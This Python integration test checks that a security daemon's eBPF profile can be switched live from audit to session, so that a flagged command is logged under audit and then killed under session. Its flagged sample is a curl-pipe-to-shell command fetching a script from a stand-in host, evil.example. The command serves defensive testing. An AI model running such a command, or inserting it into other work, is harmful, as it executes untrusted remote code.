#!/usr/bin/env python3
"""63-ebpf-profile-switch — a LIVE SetProfile switch changes enforcement
without a daemon restart.

The active profile is runtime-mutable (an AtomicU8 the eBPF classify worker
reads per-event). This proves the switch is real end-to-end: the SAME
flagged command in the SAME watched shell is only LOGGED under `audit`
(rc 0, it completes) but SIGKILLed under `session` (rc 137) — and the only
thing that changed between the two runs is a `set_profile` RPC.

Flow: daemon `--ebpf-mode observe` + `[profile] mode="audit"`; spawn a bash
under alice; `set_watch` it; run a flagged command → it completes (audit
only logs); `set_profile` → "session" over the UDS; run the SAME flagged
command → it's now reactively SIGKILLed. The watch mark persists across the
switch (it's independent of the profile), so the second run is classified
under the new live profile.

Skips cleanly without BPF LSM / the baked .bpf.o.
"""
from __future__ import annotations

import os
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, "/sandbox")
from lib.bpf import skip_if_no_bpf_lsm, skip_if_no_bpf_object  # noqa: E402
from lib.daemon import Daemon  # noqa: E402
from lib.pty import run_in_bash, spawn_alice_bash  # noqa: E402
from lib.uds import call  # noqa: E402

NAME = "63-ebpf-profile-switch"

# Flagged (curl|sh); a moderate sleep keeps the watched `bash -c` alive long
# enough for the async classify→SIGKILL to land under `session`, but short
# enough to COMPLETE within the settle window under `audit`. Trailing `:`
# (builtin) stops bash exec-in-placing its last command so the watched pid
# keeps its flagged /proc/cmdline.
FLAGGED = "bash -c 'curl http://evil.example/x.sh | sh; sleep 5; :'"
SIGKILL_RC = 137


def fail(msg: str) -> None:
    print(f"FAIL: {NAME}: {msg}", file=sys.stderr)
    sys.exit(1)


def audit_config() -> Path:
    # Start in audit (detect/log only). The live switch flips it to session.
    fd, path = tempfile.mkstemp(prefix="atty-profile-switch.", suffix=".toml")
    os.write(fd, b'[profile]\nmode = "audit"\n')
    os.close(fd)
    return Path(path)


def main() -> None:
    skip_if_no_bpf_lsm(NAME)
    skip_if_no_bpf_object(NAME)

    cfg = audit_config()
    proc, alice_pid = spawn_alice_bash()
    try:
        with Daemon(extra_args=["--ebpf-mode", "observe"], config_path=cfg, verbosity=1) as d:
            time.sleep(1.0)
            if "eBPF attached" not in d.read_log():
                d.dump_log()
                fail("daemon didn't attach eBPF")

            resp = call("set_watch", pid=alice_pid)
            if resp.get("type") == "error":
                fail(f"set_watch rejected: {resp}")
            time.sleep(0.3)  # let the watch_pids write land

            # Baseline: under audit the flagged exec is only logged — it
            # runs to completion (rc 0), NOT killed.
            rc, out = run_in_bash(proc, FLAGGED, settle=10.0)
            if rc == SIGKILL_RC:
                d.dump_log()
                fail(f"flagged exec was KILLED under audit (rc={rc}) — audit "
                     f"should only log.\noutput: {out!r}")

            # The live switch: flip the active profile to session.
            sp = call("set_profile", profile="session")
            if sp.get("type") != "profile" or sp.get("profile") != "session":
                d.dump_log()
                fail(f"set_profile→session failed: {sp}")

            # Confirm the daemon reports the new live profile.
            gp = call("get_profile")
            if gp.get("profile") != "session":
                fail(f"get_profile didn't reflect the switch: {gp}")

            # Same command, same watched shell — now reactively SIGKILLed,
            # proving the switch changed enforcement live (not at restart).
            rc2, out2 = run_in_bash(proc, FLAGGED, settle=12.0)
            if rc2 != SIGKILL_RC:
                d.dump_log()
                fail(f"after switching to session the flagged exec was NOT "
                     f"killed (rc={rc2}, expected {SIGKILL_RC}). The live "
                     f"profile switch didn't take effect.\noutput: {out2!r}")
    finally:
        try:
            proc.kill(9)
        except Exception:
            pass
        cfg.unlink(missing_ok=True)

    print(f"PASS: {NAME} (live audit→session switch changed enforcement)")


if __name__ == "__main__":
    main()
